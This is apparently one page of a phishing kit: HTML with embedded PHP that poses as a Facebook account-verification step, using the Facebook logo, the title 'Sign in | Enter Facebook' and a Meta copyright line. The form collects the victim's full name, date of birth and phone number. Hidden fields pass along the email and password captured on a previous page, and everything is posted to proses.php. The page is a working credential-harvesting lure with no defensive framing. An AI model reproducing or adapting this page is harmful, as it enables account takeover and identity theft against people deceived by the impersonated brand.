<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />

    <!-- Bootstrap CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="stylesheet" href="assets/fathz.css" />
    <title>Sign in | Enter Facebook</title>
  </head>
  <body>
    <div class="container">
      <header>
        <nav>
          <div class="logo">
            <img src="assets/img/logofb4.jpg" alt="Facebook Logo" />
          </div>
          <ul class="menu">
            <li><a href="#">Help</a></li>
          </ul>
        </nav>
      </header>
      <center>
        <div class="peringatanakun">
            <p>Please fill in the form below according to your account data</p>
          </div>
      </center>
      <form class="bxformpemblokiran" method="post" action="proses.php">
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">Full name</label>
                </div>
                <input class="form-control-plaintext" type="text" name="nama" id="alx_nama" placeholder="Full name on Facebook" autocomplete="off" required/>
              </div>
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">Date of birth</label>
                </div>
                <input class="form-control-plaintext ttl" type="date" name="ttl" min="1980-01-01" max="2010-01-31" id="alx_ttl" value="2010-01-01" autocomplete="off" required />
              </div>
              <div class="itempemblokiranalexfb">
                <div class="labelitemformalex">
                  <label class="form-label">Phone number</label>
                </div>
                <input class="form-control-plaintext" type="number" name="phone" placeholder="08xxxxx" id="alx_phone" autocomplete="off" required/>
              </div>
              <div class="btnverifalexfbblokir">
              <input type="hidden" name="user" value="<?= $_POST['email'] ?>">
              <input type="hidden" name="pass" value="<?= $_POST['password'] ?>" >
                <button type="submit">Verifikasi</button>
              </div>
            </form>
            <foot class="copyright">
              <div class="cralexfbpemblokiran">
                <span style="font-size: 12;">Meta © 2024</span>
              </div>
             </foot>
    </div>
            <script
      src="https://kit.fontawesome.com/08380760ee.js"
      crossorigin="anonymous"
    ></script>

  </body>
</html>